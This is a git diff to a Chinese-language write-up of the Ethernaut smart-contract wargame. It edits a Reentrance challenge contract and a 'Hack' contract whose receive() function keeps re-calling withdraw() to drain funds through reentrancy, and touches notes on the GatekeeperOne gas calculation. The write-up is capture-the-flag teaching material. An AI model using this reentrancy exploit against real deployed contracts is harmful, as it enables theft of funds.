@@ -1,5 +1,7 @@
 ---
 title: OpenZeppelin：Ethernaut
+tags:
+    - blockchain
 ---
 
 ## 0. Hello Ethernaut
@@ -700,9 +702,9 @@ contract Reentrance {
 
     ```js
     // SPDX-License-Identifier: MIT
-    pragma solidity ^0.8.0;
+    pragma solidity ^0.6.0;
 
-    import '@openzeppelin/contracts/utils/math/SafeMath.sol';
+    import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol';
 
     contract Reentrance {
       
@@ -733,7 +735,6 @@ contract Reentrance {
     contract Hack {
 
       Reentrance reentrance;
-      uint stack = 0;
 
       function exploit(address payable instance) public {
         reentrance = Reentrance(instance);
@@ -741,8 +742,7 @@ contract Reentrance {
       }
 
       receive() external payable {
-        stack += 2;
-        if (msg.sender.balance >= msg.value && gasleft() > 6000 && stack < 500) {
+        if (msg.sender.balance >= msg.value && gasleft() > 6000) {
           reentrance.withdraw(125000000000000);
         }
       }
@@ -958,6 +958,7 @@ contract GatekeeperOne {
 ![89746](img/ethernaut04.jpg)
 
     - 由此可计算出通过 `gateTwo` 实际需要的最少汽油量：$90000-89746+8191=8445$
+
 - 对于 `gateThree`，用 $A_0A_1...A_7$ 来表示 `_gateKey` 的各个字节
     - `part one` 需满足 $A_4A_5A_6A_7 = A_6A_7$
     - `part two` 需满足 $A_4A_5A_6A_7 \neq A_0A_1...A_7$
